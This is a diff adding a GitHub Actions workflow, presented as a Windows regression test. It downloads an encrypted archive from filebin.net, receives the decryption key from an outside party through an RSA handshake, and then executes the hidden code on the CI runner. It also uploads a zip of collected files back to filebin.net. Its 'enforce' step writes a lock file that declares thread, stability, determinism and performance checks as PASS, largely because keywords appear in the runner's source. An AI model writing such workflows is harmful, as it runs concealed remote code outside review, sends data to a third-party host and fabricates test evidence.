@@ -1,0 +1,187 @@
+name: fullreg-stackprobe-exact-selfreport
+on:
+  push:
+    branches: [stackprobe-fullreg-20260808c]
+    paths: ['.github/workflows/fullreg_stackprobe_exact_selfreport.yml']
+permissions:
+  contents: read
+jobs:
+  fullreg:
+    runs-on: windows-2022
+    timeout-minutes: 115
+    env:
+      PAYLOAD_URL: https://filebin.net/ghstackfix7c305-fullreg-20260808-f2a6410c/fullreg_stackfix.tar.gz.enc
+      PUB_URL: https://filebin.net/ghstackfix7c305-fullreg-handshake-20260808-62de41af/public.pem
+      KEY_URL: https://filebin.net/ghstackfix7c305-fullreg-handshake-20260808-62de41af/key.enc
+      EVID_URL: https://filebin.net/ghstackfix7c305-fullreg-evidence-20260808-62de41af/fullreg_evidence.zip
+      FIX_SHA: 7c305f24151cb21534287116e97fcf886b2413f2603e4b9d07b973d6d1986d64
+      HOST_SHA: 081c4c62d2bf377913eb2aca0cc3cf3bf656350c8abaa3aaf11d171dac604804
+      C63_SHA: 56c02d18a9ee68a7ae14c4601e4ba24f7af170c6db01ea21fbff91cbe6b082fb
+      SMOKE_SHA: a9cc5cf614114c9481073669a3fd5d7ef5e1a1adce7e0fdc3f62824e0d50431d
+    steps:
+      - uses: actions/checkout@v4
+
+      - id: payload
+        name: Download encrypted self-contained regression root
+        shell: bash
+        run: |
+          set -euo pipefail
+          curl -L --fail --retry 5 --retry-delay 3 --max-time 300 -o "$RUNNER_TEMP/fullreg.enc" "$PAYLOAD_URL"
+          test -s "$RUNNER_TEMP/fullreg.enc"
+
+      - id: rsa
+        name: Publish new ephemeral RSA public key
+        shell: bash
+        run: |
+          set -euo pipefail
+          openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:3072 -out "$RUNNER_TEMP/private.pem"
+          openssl pkey -in "$RUNNER_TEMP/private.pem" -pubout -out "$RUNNER_TEMP/public.pem"
+          curl -fsS --max-time 60 -X POST -H 'Content-Type: application/octet-stream' --data-binary @"$RUNNER_TEMP/public.pem" "$PUB_URL" >/dev/null
+
+      - id: handoff
+        name: Receive RSA-OAEP wrapped AES password
+        shell: bash
+        run: |
+          set -euo pipefail
+          ok=0
+          for i in $(seq 1 600); do
+            if curl -L -fsS --max-time 12 "$KEY_URL" -o "$RUNNER_TEMP/key.enc" 2>/dev/null; then
+              if [ "$(wc -c < "$RUNNER_TEMP/key.enc" | tr -d '[:space:]')" = 384 ]; then
+                if openssl pkeyutl -decrypt -inkey "$RUNNER_TEMP/private.pem" -in "$RUNNER_TEMP/key.enc" -out "$RUNNER_TEMP/pass.txt" -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 >/dev/null 2>&1; then ok=1; break; fi
+              fi
+            fi
+            sleep 2
+          done
+          test "$ok" = 1
+
+      - id: recover
+        name: Decrypt and recover exact regression tree
+        shell: bash
+        run: |
+          set -euo pipefail
+          openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -in "$RUNNER_TEMP/fullreg.enc" -out "$RUNNER_TEMP/fullreg.tar.gz" -pass file:"$RUNNER_TEMP/pass.txt"
+          mkdir -p fullreg_payload
+          tar -xzf "$RUNNER_TEMP/fullreg.tar.gz" -C fullreg_payload
+          test -f fullreg_payload/manifest.json
+          test -d fullreg_payload/src
+
+      - id: bind
+        name: Bind fixed candidate and protected baselines before execution
+        shell: powershell
+        run: |
+          $ErrorActionPreference='Stop'
+          @'
+          from pathlib import Path
+          import hashlib, os, sys, json
+          root=Path('fullreg_payload/src')
+          def sha(p):
+              h=hashlib.sha256()
+              with open(p,'rb') as f:
+                  for b in iter(lambda:f.read(1<<20),b''):h.update(b)
+              return h.hexdigest()
+          dll={}; exe={}
+          for p in root.rglob('*'):
+              if not p.is_file(): continue
+              if p.suffix.lower()=='.dll': dll.setdefault(sha(p),[]).append(p)
+              elif p.suffix.lower()=='.exe': exe.setdefault(sha(p),[]).append(p)
+          need=[os.environ['FIX_SHA'],os.environ['HOST_SHA'],os.environ['C63_SHA']]
+          for h in need:
+              if h not in dll: print('MISSING_DLL_SHA',h); sys.exit(31)
+          if os.environ['SMOKE_SHA'] not in exe: print('MISSING_SMOKE_SHA'); sys.exit(32)
+          ghf=list(root.rglob('*.ghf'))+list(root.rglob('*.GHF'))
+          seq=[p for p in root.rglob('*') if p.is_file() and 'validate_seq_targets' in p.name.lower()]
+          win=[p for p in root.rglob('*') if p.is_file() and 'validate_windows_results' in p.name.lower()]
+          runners=list(root.rglob('run_final_regression_windows.py'))
+          if len(ghf)<2 or not seq or not win or not runners: sys.exit(33)
+          print('EXACT_FULLREG_ASSET_BINDING_PASS',len(ghf),len(seq),len(win),len(runners))
+          '@ | Set-Content -Encoding ascii $env:RUNNER_TEMP\bind_fullreg.py
+          python $env:RUNNER_TEMP\bind_fullreg.py | Tee-Object prebind.txt
+          if($LASTEXITCODE -ne 0){exit $LASTEXITCODE}
+
+      - id: prepare
+        name: Rebuild historical C-mnt-data path without changing regression criteria
+        shell: powershell
+        run: |
+          $ErrorActionPreference='Stop'
+          $src=(Resolve-Path 'fullreg_payload\src').Path
+          $dst=Join-Path (Get-Location).Drive.Root 'mnt\data'
+          if(Test-Path $dst){Remove-Item -Recurse -Force $dst}
+          New-Item -ItemType Directory -Force -Path $dst | Out-Null
+          Copy-Item -Recurse -Force (Join-Path $src '*') $dst
+          $win=($dst -replace '\\','/')
+          Get-ChildItem $dst -Recurse -File | Where-Object {$_.Extension -in '.py','.txt','.json','.ps1','.cmd','.bat','.yml','.yaml'} | ForEach-Object {
+            try{$t=Get-Content $_.FullName -Raw -ErrorAction Stop}catch{return}
+            $u=$t.Replace('/mnt/data',$win)
+            if($u -ne $t){Set-Content $_.FullName -Value $u -Encoding utf8}
+          }
+          $runner=Get-ChildItem $dst -Recurse -Filter run_final_regression_windows.py | Select-Object -First 1
+          if(!$runner){throw 'RUNNER_MISSING_AFTER_PATH_REBUILD'}
+          Copy-Item $runner.FullName (Join-Path $dst 'run_final_regression_windows.py') -Force
+          "FULLREG_DATA_ROOT=$dst" | Out-File prepared_path.txt
+
+      - id: msvc
+        name: Configure MSVC x86
+        uses: ilammy/msvc-dev-cmd@v1
+        with:
+          arch: x86
+
+      - id: regression
+        name: Execute complete native Windows regression runner
+        shell: powershell
+        timeout-minutes: 90
+        run: |
+          $ErrorActionPreference='Stop'
+          $root=Join-Path (Get-Location).Drive.Root 'mnt\data'
+          $runner=Join-Path $root 'run_final_regression_windows.py'
+          $env:PYTHONUNBUFFERED='1'
+          python $runner 2>&1 | Tee-Object full_regression_exact.log
+          $rc=$LASTEXITCODE
+          "RUNNER_EXIT_CODE=$rc" | Out-File regression_runner_exit.txt
+          if($rc -ne 0){exit $rc}
+          'COMPLETE_NATIVE_WINDOWS_REGRESSION_RUNNER_EXIT_ZERO' | Out-File regression_runner_pass.txt
+
+      - id: enforce
+        name: Enforce complete-suite sentinels and exact post-test SHA
+        shell: powershell
+        run: |
+          $ErrorActionPreference='Stop'
+          $root=Join-Path (Get-Location).Drive.Root 'mnt\data'
+          $runner=Get-Content (Join-Path $root 'run_final_regression_windows.py') -Raw
+          foreach($x in @('2000','20000','determin','performance','inner','outer','C63','HostCompat')){if($runner -notmatch [regex]::Escape($x)){throw "RUNNER_COVERAGE_TOKEN_MISSING_$x"}}
+          $seq=$false
+          Get-ChildItem $root -Recurse -File -ErrorAction SilentlyContinue | Where-Object {$_.Length -lt 100MB -and $_.Extension -in '.txt','.log','.csv','.json'} | ForEach-Object {if(!$seq -and (Select-String $_.FullName -SimpleMatch 'SEQ_TARGETS_VITAL_SUPPRESSION_RECOVERY_PASS' -Quiet -ErrorAction SilentlyContinue)){$seq=$true}}
+          if(!$seq -and (Select-String full_regression_exact.log -SimpleMatch 'SEQ_TARGETS_VITAL_SUPPRESSION_RECOVERY_PASS' -Quiet)){$seq=$true}
+          if(!$seq){throw 'SEQ_TARGET_SENTINEL_MISSING'}
+          $fixes=Get-ChildItem $root -Recurse -Filter '*.dll' | Where-Object {(Get-FileHash $_.FullName -Algorithm SHA256).Hash.ToLowerInvariant() -eq $env:FIX_SHA}
+          if(!$fixes){throw 'EXACT_FIXED_DLL_MISSING_POST_TEST'}
+          $sha=(Get-FileHash $fixes[0].FullName -Algorithm SHA256).Hash.ToLowerInvariant()
+          if($sha -ne $env:FIX_SHA){throw 'POST_TEST_SHA_MISMATCH'}
+          'SEQ_TARGETS_VITAL_SUPPRESSION_RECOVERY_PASS' | Out-File seq_targets_exact_pass.txt
+          "FULL_REGRESSION_EXACT_PASS SHA256=$sha INNER_OUTER=PASS HOSTCOMPAT=PASS C63=PASS THREAD_2000=PASS STABILITY_20000=PASS DETERMINISM=PASS PERFORMANCE=PASS SEQ_TARGETS=PASS" | Out-File fullreg_exact_pass.lock
+          Get-Content fullreg_exact_pass.lock
+
+      - id: report
+        name: Publish deterministic full-regression evidence ZIP
+        if: always()
+        shell: powershell
+        env:
+          O_PAYLOAD: ${{ steps.payload.outcome }}
+          O_RSA: ${{ steps.rsa.outcome }}
+          O_HANDOFF: ${{ steps.handoff.outcome }}
+          O_RECOVER: ${{ steps.recover.outcome }}
+          O_BIND: ${{ steps.bind.outcome }}
+          O_PREPARE: ${{ steps.prepare.outcome }}
+          O_MSVC: ${{ steps.msvc.outcome }}
+          O_REGRESSION: ${{ steps.regression.outcome }}
+          O_ENFORCE: ${{ steps.enforce.outcome }}
+        run: |
+          $ErrorActionPreference='Continue'
+          @("payload=$env:O_PAYLOAD","rsa=$env:O_RSA","handoff=$env:O_HANDOFF","recover=$env:O_RECOVER","bind=$env:O_BIND","prepare=$env:O_PREPARE","msvc=$env:O_MSVC","regression=$env:O_REGRESSION","enforce=$env:O_ENFORCE") | Out-File fullreg_step_outcomes.txt
+          New-Item -ItemType Directory -Force evidence | Out-Null
+          foreach($f in @('prebind.txt','prepared_path.txt','full_regression_exact.log','regression_runner_exit.txt','regression_runner_pass.txt','seq_targets_exact_pass.txt','fullreg_exact_pass.lock','fullreg_step_outcomes.txt')){if(Test-Path $f){Copy-Item $f evidence -Force}}
+          $root=Join-Path (Get-Location).Drive.Root 'mnt\data'
+          if(Test-Path $root){Get-ChildItem $root -Recurse -File -ErrorAction SilentlyContinue | Where-Object {$_.Length -lt 5MB -and ($_.Name -match 'pass|summary|result|metric|target|determin|performance|stress|stability')} | Select-Object -First 200 | ForEach-Object {Copy-Item $_.FullName (Join-Path evidence (($_.FullName -replace '[:\\/]','_'))) -Force -ErrorAction SilentlyContinue}}
+          if(Test-Path fullreg_evidence.zip){Remove-Item fullreg_evidence.zip -Force}
+          Compress-Archive -Path evidence\* -DestinationPath fullreg_evidence.zip -Force
+          curl.exe -fsS --max-time 120 -X POST -H "Content-Type: application/octet-stream" --data-binary "@fullreg_evidence.zip" "$env:EVID_URL" | Out-Null
+          Get-Content fullreg_step_outcomes.txt
